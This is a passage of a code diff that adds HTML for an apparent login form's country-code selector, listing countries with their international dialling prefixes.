+                   Uganda ‪(+256)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ua" data-country-code="380">
+                  <span class="flag-ua">
+                  </span>
+                  <span class="country-code">
+                   Ukraine ‪(+380)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ae" data-country-code="971">
+                  <span class="flag-ae">
+                  </span>
+                  <span class="country-code">
+                   United Arab Emirates ‪(+971)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="uk" data-country-code="44">
+                  <span class="flag-uk">
+                  </span>
+                  <span class="country-code">
+                   United Kingdom ‪(+44)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="us" data-country-code="1">
+                  <span class="flag-us">
+                  </span>
+                  <span class="country-code">
+                   United States ‪(+1)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="uy" data-country-code="598">
+                  <span class="flag-uy">
+                  </span>
+                  <span class="country-code">
+                   Uruguay ‪(+598)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="uz" data-country-code="998">
+                  <span class="flag-uz">
+                  </span>
+                  <span class="country-code">
+                   Uzbekistan ‪(+998)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="vu" data-country-code="678">
+                  <span class="flag-vu">
+                  </span>
+                  <span class="country-code">
+                   Vanuatu ‪(+678)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="va" data-country-code="39">
+                  <span class="flag-va">
+                  </span>
+                  <span class="country-code">
+                   Vatican City State ‪(+39)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ve" data-country-code="58">
+                  <span class="flag-ve">
+                  </span>
+                  <span class="country-code">
+                   Venezuela ‪(+58)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="vn" data-country-code="84">
+                  <span class="flag-vn">
+                  </span>
+                  <span class="country-code">
+                   Vietnam ‪(+84)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="wf" data-country-code="681">
+                  <span class="flag-wf">
+                  </span>
+                  <span class="country-code">
+                   Wallis and Futuna ‪(+681)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ye" data-country-code="967">
+                  <span class="flag-ye">
+                  </span>
+                  <span class="country-code">
+                   Yemen ‪(+967)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="zm" data-country-code="260">
+                  <span class="flag-zm">
+                  </span>
+                  <span class="country-code">
+                   Zambia ‪(+260)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="zw" data-country-code="263">
+                  <span class="flag-zw">
+                  </span>
+                  <span class="country-code">
+                   Zimbabwe ‪(+263)‬
+                  </span>
+                 </a>
+                </li>
+               </ul>
+              </div>
+              <label for="login-select-country-code" class="mbr-hide">
+               Country menu
+              </label>
+              <noscript>
+               &lt;div class="show-conuntry-code-selectbox"&gt;
+              </noscript>
+              <select class="mbr-hide" drop-down-type="country-code" name="countrycode" data="country-code-drop-down" corresponding-field-id="login-username" id="login-select-country-code">
+               <option corresponding-field-data-format="" aria-label="Afghanistan" value="93" data-country-intl="af">
+                Afghanistan ‪(+93)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Albania" value="355" data-country-intl="al">
+                Albania ‪(+355)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Algeria" value="213" data-country-intl="dz">
+                Algeria ‪(+213)‬
+               </option>
+               <option corresponding-field-data-format="(XXX) XXX-XXXX" aria-label="American Samoa" value="1" data-country-intl="as">
+                American Samoa ‪(+1)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Andorra" value="376" data-country-intl="ad">
+                Andorra ‪(+376)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Angola" value="244" data-country-intl="ao">
+                Angola ‪(+244)‬
+               </option>
+               <option corresponding-field-data-format="(XXX) XXX-XXXX" aria-label="Anguilla" value="1" data-country-intl="ai">
+                Anguilla ‪(+1)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Antarctica" value="672" data-country-intl="aq">
+                Antarctica ‪(+672)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Antigua, Barbuda" value="1268" data-country-intl="ag">
+                Antigua, Barbuda ‪(+1268)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Argentina" value="54" data-country-intl="ar">
+                Argentina ‪(+54)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Armenia" value="374" data-country-intl="am">
+                Armenia ‪(+374)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Aruba" value="297" data-country-intl="aw">
+                Aruba ‪(+297)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Ascension" value="247" data-country-intl="ac">
+                Ascension ‪(+247)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Australia" value="61" data-country-intl="au">
+                Australia ‪(+61)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Austria" value="43" data-country-intl="at">
+                Austria ‪(+43)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Azerbaidijan" value="994" data-country-intl="az">
+                Azerbaidijan ‪(+994)‬
+               </option>
+               <option corresponding-field-data-format="(XXX) XXX-XXXX" aria-label="Bahamas" value="1" data-country-intl="bs">
+                Bahamas ‪(+1)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Bahrain" value="973" data-country-intl="bh">
+                Bahrain ‪(+973)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Bangladesh" value="880" data-country-intl="bd">
+                Bangladesh ‪(+880)‬
+               </option>
+               <option corresponding-field-data-format="(XXX) XXX-XXXX" aria-label="Barbados" value="1" data-country-intl="bb">
+                Barbados ‪(+1)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Belarus" value="375" data-country-intl="by">
+                Belarus ‪(+375)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Belgium" value="32" data-country-intl="be">
+                Belgium ‪(+32)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Belize" value="501" data-country-intl="bz">
+                Belize ‪(+501)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Benin" value="229" data-country-intl="bj">
+                Benin ‪(+229)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Bermuda" value="1441" data-country-intl="bm">
+                Bermuda ‪(+1441)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Bhutan" value="975" data-country-intl="bt">
+                Bhutan ‪(+975)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Bolivia" value="591" data-country-intl="bo">
+                Bolivia ‪(+591)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Bosnia & Herzegovina" value="387" data-country-intl="ba">
+                Bosnia &amp; Herzegovina ‪(+387)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Botswana" value="267" data-country-intl="bw">
+                Botswana ‪(+267)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Brazil" value="55" data-country-intl="br">
+                Brazil ‪(+55)‬
+               </option>
+               <option corresponding-field-data-format="(XXX) XXX-XXXX" aria-label="British Virgin Islands" value="1" data-country-intl="vg">
+                British Virgin Islands ‪(+1)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Brunei Darussalam" value="673" data-country-intl="bn">
+                Brunei Darussalam ‪(+673)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Bulgaria" value="359" data-country-intl="bg">
+                Bulgaria ‪(+359)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Burkina Faso" value="226" data-country-intl="bf">
+                Burkina Faso ‪(+226)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Burundi" value="257" data-country-intl="bi">
+                Burundi ‪(+257)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Cambodia" value="855" data-country-intl="kh">
+                Cambodia ‪(+855)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Cameroon" value="237" data-country-intl="cm">
+                Cameroon ‪(+237)‬
+               </option>
+               <option corresponding-field-data-format="(XXX) XXX-XXXX" aria-label="Canada" value="1" data-country-intl="ca">
+                Canada ‪(+1)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Cape Verde" value="238" data-country-intl="cv">
+                Cape Verde ‪(+238)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Cayman Islands" value="1345" data-country-intl="ky">
+                Cayman Islands ‪(+1345)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Central African Republic" value="236" data-country-intl="cf">
+                Central African Republic ‪(+236)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Chad" value="235" data-country-intl="td">
+                Chad ‪(+235)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Chile" value="56" data-country-intl="cl">
+                Chile ‪(+56)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="China" value="86" data-country-intl="cn">
+                China ‪(+86)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Colombia" value="57" data-country-intl="co">
+                Colombia ‪(+57)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Comoros" value="269" data-country-intl="km">
+                Comoros ‪(+269)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Cook Islands" value="682" data-country-intl="ck">
+                Cook Islands ‪(+682)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Costa Rica" value="506" data-country-intl="cr">
+                Costa Rica ‪(+506)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Croatia" value="385" data-country-intl="hr">
+                Croatia ‪(+385)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Cyprus" value="357" data-country-intl="cy">
+                Cyprus ‪(+357)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Czech Republic" value="420" data-country-intl="cz">
+                Czech Republic ‪(+420)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Denmark" value="45" data-country-intl="dk">
+                Denmark ‪(+45)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Diego Garcia" value="246" data-country-intl="dg">
+                Diego Garcia ‪(+246)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Djibouti" value="253" data-country-intl="dj">
+                Djibouti ‪(+253)‬
+               </option>
+               <option corresponding-field-data-format="(XXX) XXX-XXXX" aria-label="Dominica" value="1" data-country-intl="dm">
+                Dominica ‪(+1)‬
+               </option>
+               <option corresponding-field-data-format="(XXX) XXX-XXXX" aria-label="Dominican Republic" value="1" data-country-intl="do">
+                Dominican Republic ‪(+1)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="East Timor" value="670" data-country-intl="tl">
+                East Timor ‪(+670)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Ecuador" value="593" data-country-intl="ec">
+                Ecuador ‪(+593)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Egypt" value="20" data-country-intl="eg">
+                Egypt ‪(+20)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="El Salvador" value="503" data-country-intl="sv">
+                El Salvador ‪(+503)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Equatorial Guinea" value="240" data-country-intl="gq">
+                Equatorial Guinea ‪(+240)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Eritrea" value="291" data-country-intl="er">
+                Eritrea ‪(+291)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Estonia" value="372" data-country-intl="ee">
+                Estonia ‪(+372)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Ethiopia" value="251" data-country-intl="et">
+                Ethiopia ‪(+251)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Falklands Islands" value="500" data-country-intl="fk">
+                Falklands Islands ‪(+500)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Faroe Islands" value="298" data-country-intl="fo">
+                Faroe Islands ‪(+298)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Fiji Islands" value="679" data-country-intl="fj">
+                Fiji Islands ‪(+679)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Finland" value="358" data-country-intl="fi">
+                Finland ‪(+358)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="France" value="33" data-country-intl="fr">
+                France ‪(+33)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="French Dept/Terr in Indian Ocean" value="262" data-country-intl="yy">
+                French Dept/Terr in Indian Ocean ‪(+262)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="French Guiana" value="594" data-country-intl="gf">
+                French Guiana ‪(+594)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="French Polynesia" value="689" data-country-intl="pf">
+                French Polynesia ‪(+689)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Gabon" value="241" data-country-intl="ga">
+                Gabon ‪(+241)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Gambia" value="220" data-country-intl="gm">
+                Gambia ‪(+220)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Georgia" value="995" data-country-intl="ge">
+                Georgia ‪(+995)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Germany" value="49" data-country-intl="de">
+                Germany ‪(+49)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Ghana" value="233" data-country-intl="gh">
+                Ghana ‪(+233)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Gibraltar" value="350" data-country-intl="gi">
+                Gibraltar ‪(+350)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Greece" value="30" data-country-intl="gr">
+                Greece ‪(+30)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Greenland" value="299" data-country-intl="gl">
+                Greenland ‪(+299)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Grenada" value="1473" data-country-intl="gd">
+                Grenada ‪(+1473)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Guadeloupe" value="590" data-country-intl="gp">
+                Guadeloupe ‪(+590)‬
+               </option>
+               <option corresponding-field-data-format="(XXX) XXX-XXXX" aria-label="Guam" value="1" data-country-intl="gu">
+                Guam ‪(+1)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Guatemala" value="502" data-country-intl="gt">
+                Guatemala ‪(+502)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Guinea" value="224" data-country-intl="gn">
+                Guinea ‪(+224)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Guinea-Bissau" value="245" data-country-intl="gw">
+                Guinea-Bissau ‪(+245)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Guyana" value="592" data-country-intl="gy">
+                Guyana ‪(+592)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Haiti" value="509" data-country-intl="ht">
+                Haiti ‪(+509)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Honduras" value="504" data-country-intl="hn">
+                Honduras ‪(+504)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Hong Kong" value="852" data-country-intl="hk">
+                Hong Kong ‪(+852)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Hungary" value="36" data-country-intl="hu">
+                Hungary ‪(+36)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Iceland" value="354" data-country-intl="is">
+                Iceland ‪(+354)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="India" value="91" data-country-intl="in">
+                India ‪(+91)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Indonesia" value="62" data-country-intl="id">
+                Indonesia ‪(+62)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Iraq" value="964" data-country-intl="iq">
+                Iraq ‪(+964)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Ireland" value="353" data-country-intl="ie">
+                Ireland ‪(+353)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Israel" value="972" data-country-intl="il">
+                Israel ‪(+972)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Italy" value="39" data-country-intl="it">
+                Italy ‪(+39)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Jamaica" value="1876" data-country-intl="jm">
+                Jamaica ‪(+1876)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Japan" value="81" data-country-intl="jp">
+                Japan ‪(+81)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Jordan" value="962" data-country-intl="jo">
+                Jordan ‪(+962)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Kenya" value="254" data-country-intl="ke">
+                Kenya ‪(+254)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Kiribati" value="686" data-country-intl="ki">
+                Kiribati ‪(+686)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Kuwait" value="965" data-country-intl="kw">
+                Kuwait ‪(+965)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Kyrgyzstan" value="996" data-country-intl="kg">
+                Kyrgyzstan ‪(+996)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Lao" value="856" data-country-intl="la">
+                Lao ‪(+856)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Latvia" value="371" data-country-intl="lv">
+                Latvia ‪(+371)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Lebanon" value="961" data-country-intl="lb">
+                Lebanon ‪(+961)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Lesotho" value="266" data-country-intl="ls">
+                Lesotho ‪(+266)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Liberia" value="231" data-country-intl="lr">
+                Liberia ‪(+231)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Liechtenstein" value="423" data-country-intl="li">
+                Liechtenstein ‪(+423)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Lithuania" value="370" data-country-intl="lt">
+                Lithuania ‪(+370)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Luxembourg" value="352" data-country-intl="lu">
+                Luxembourg ‪(+352)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Macao" value="853" data-country-intl="mo">
+                Macao ‪(+853)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Macedonia" value="389" data-country-intl="mk">
+                Macedonia ‪(+389)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Madagascar" value="261" data-country-intl="mg">
+                Madagascar ‪(+261)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Malawi" value="265" data-country-intl="mw">
+                Malawi ‪(+265)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Malaysia" value="60" data-country-intl="my">
+                Malaysia ‪(+60)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Maldives" value="960" data-country-intl="mv">
+                Maldives ‪(+960)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Mali" value="223" data-country-intl="ml">
+                Mali ‪(+223)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Malta" value="356" data-country-intl="mt">
+                Malta ‪(+356)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Marshall Islands" value="692" data-country-intl="mh">
+                Marshall Islands ‪(+692)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Martinique" value="596" data-country-intl="mq">
+                Martinique ‪(+596)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Mauritania" value="222" data-country-intl="mr">
+                Mauritania ‪(+222)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Mauritius" value="230" data-country-intl="mu">
+                Mauritius ‪(+230)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Mexico" value="52" data-country-intl="mx">
+                Mexico ‪(+52)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Micronesia" value="691" data-country-intl="fm">
+                Micronesia ‪(+691)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Moldova" value="373" data-country-intl="md">
+                Moldova ‪(+373)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Monaco" value="377" data-country-intl="mc">
+                Monaco ‪(+377)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Mongolia" value="976" data-country-intl="mn">
+                Mongolia ‪(+976)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Montenegro" value="382" data-country-intl="me">
+                Montenegro ‪(+382)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Montserrat" value="1664" data-country-intl="ms">
+                Montserrat ‪(+1664)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Morocco" value="212" data-country-intl="ma">
+                Morocco ‪(+212)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Mozambique" value="258" data-country-intl="mz">
+                Mozambique ‪(+258)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Namibia" value="264" data-country-intl="na">
+                Namibia ‪(+264)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Nauru" value="674" data-country-intl="nr">
+                Nauru ‪(+674)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Nepal" value="977" data-country-intl="np">
+                Nepal ‪(+977)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Netherlands" value="31" data-country-intl="nl">
+                Netherlands ‪(+31)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Netherlands Antilles" value="599" data-country-intl="an">
+                Netherlands Antilles ‪(+599)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="New Caledonia" value="687" data-country-intl="nc">
+                New Caledonia ‪(+687)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="New Zealand" value="64" data-country-intl="nz">
+                New Zealand ‪(+64)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Nicaragua" value="505" data-country-intl="ni">
+                Nicaragua ‪(+505)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Niger" value="227" data-country-intl="ne">
+                Niger ‪(+227)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Nigeria" value="234" data-country-intl="ng">
+                Nigeria ‪(+234)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Niue" value="683" data-country-intl="nu">
+                Niue ‪(+683)‬
+               </option>
+               <option corresponding-field-data-format="(XXX) XXX-XXXX" aria-label="Northern Mariana Islands" value="1" data-country-intl="mp">
+                Northern Mariana Islands ‪(+1)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Norway" value="47" data-country-intl="no">
+                Norway ‪(+47)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Oman" value="968" data-country-intl="om">
+                Oman ‪(+968)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Pakistan" value="92" data-country-intl="pk">
+                Pakistan ‪(+92)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Palau" value="680" data-country-intl="pw">
+                Palau ‪(+680)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Panama" value="507" data-country-intl="pa">
+                Panama ‪(+507)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Papua New Guinea" value="675" data-country-intl="pg">
+                Papua New Guinea ‪(+675)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Paraguay" value="595" data-country-intl="py">
+                Paraguay ‪(+595)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Peru" value="51" data-country-intl="pe">
+                Peru ‪(+51)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Philippines" value="63" data-country-intl="ph">
+                Philippines ‪(+63)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Poland" value="48" data-country-intl="pl">
+                Poland ‪(+48)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Portugal" value="351" data-country-intl="pt">
+                Portugal ‪(+351)‬
+               </option>
+               <option corresponding-field-data-format="(XXX) XXX-XXXX" aria-label="Puerto-Rico" value="1" data-country-intl="pr">
+                Puerto-Rico ‪(+1)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Qatar" value="974" data-country-intl="qa">
+                Qatar ‪(+974)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Reunion" value="262" data-country-intl="re">
+                Reunion ‪(+262)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Romania" value="40" data-country-intl="ro">
+                Romania ‪(+40)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Russia" value="7" data-country-intl="ru">
+                Russia ‪(+7)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Rwanda" value="250" data-country-intl="rw">
+                Rwanda ‪(+250)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Saint Helena" value="290" data-country-intl="sh">
+                Saint Helena ‪(+290)‬
+               </option>
+               <option corresponding-field-data-format="(XXX) XXX-XXXX" aria-label="Saint Kitts and Nevis" value="1" data-country-intl="kn">
+                Saint Kitts and Nevis ‪(+1)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Saint Lucia" value="1758" data-country-intl="lc">
+                Saint Lucia ‪(+1758)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Saint Pierre and Miquelon" value="508" data-country-intl="pm">
+                Saint Pierre and Miquelon ‪(+508)‬
+               </option>
+               <option corresponding-field-data-format="(XXX) XXX-XXXX" aria-label="Saint Vincent and the Grenadines" value="1" data-country-intl="vc">
+                Saint Vincent and the Grenadines ‪(+1)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Samoa" value="685" data-country-intl="ws">
+                Samoa ‪(+685)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="San Marino" value="378" data-country-intl="sm">
+                San Marino ‪(+378)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Sao Tome and Principe" value="239" data-country-intl="st">
+                Sao Tome and Principe ‪(+239)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Saudi Arabia" value="966" data-country-intl="sa">
+                Saudi Arabia ‪(+966)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Senegal" value="221" data-country-intl="sn">
+                Senegal ‪(+221)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Serbia" value="381" data-country-intl="rs">
+                Serbia ‪(+381)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Seychelles" value="248" data-country-intl="sc">
+                Seychelles ‪(+248)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Sierra Leone" value="232" data-country-intl="sl">
+                Sierra Leone ‪(+232)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Singapore" value="65" data-country-intl="sg">
+                Singapore ‪(+65)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Slovakia" value="421" data-country-intl="sk">
+                Slovakia ‪(+421)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Slovenia" value="386" data-country-intl="si">
+                Slovenia ‪(+386)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Solomon Islands" value="677" data-country-intl="sb">
+                Solomon Islands ‪(+677)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="South Africa" value="27" data-country-intl="za">
+                South Africa ‪(+27)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="South Korea" value="82" data-country-intl="kr">
+                South Korea ‪(+82)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Spain" value="34" data-country-intl="es">
+                Spain ‪(+34)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Sri Lanka" value="94" data-country-intl="lk">
+                Sri Lanka ‪(+94)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Suriname" value="597" data-country-intl="sr">
+                Suriname ‪(+597)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Swaziland" value="268" data-country-intl="sz">
+                Swaziland ‪(+268)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Sweden" value="46" data-country-intl="se">
+                Sweden ‪(+46)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Switzerland" value="41" data-country-intl="ch">
+                Switzerland ‪(+41)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Taiwan" value="886" data-country-intl="tw">
+                Taiwan ‪(+886)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Tajikistan" value="992" data-country-intl="tj">
+                Tajikistan ‪(+992)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Tanzania" value="255" data-country-intl="tz">
+                Tanzania ‪(+255)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Thailand" value="66" data-country-intl="th">
+                Thailand ‪(+66)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Togo" value="228" data-country-intl="tg">
+                Togo ‪(+228)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Tokelau" value="690" data-country-intl="tk">
+                Tokelau ‪(+690)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Tonga" value="676" data-country-intl="to">
+                Tonga ‪(+676)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Trinidad, Tobago" value="1868" data-country-intl="tt">
+                Trinidad, Tobago ‪(+1868)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Tunisia" value="216" data-country-intl="tn">
+                Tunisia ‪(+216)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Turkey" value="90" data-country-intl="tr">
+                Turkey ‪(+90)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Turkmenistan" value="993" data-country-intl="tm">
+                Turkmenistan ‪(+993)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Turks and Caicos" value="1649" data-country-intl="tc">
+                Turks and Caicos ‪(+1649)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Tuvalu" value="688" data-country-intl="tv">
+                Tuvalu ‪(+688)‬
+               </option>
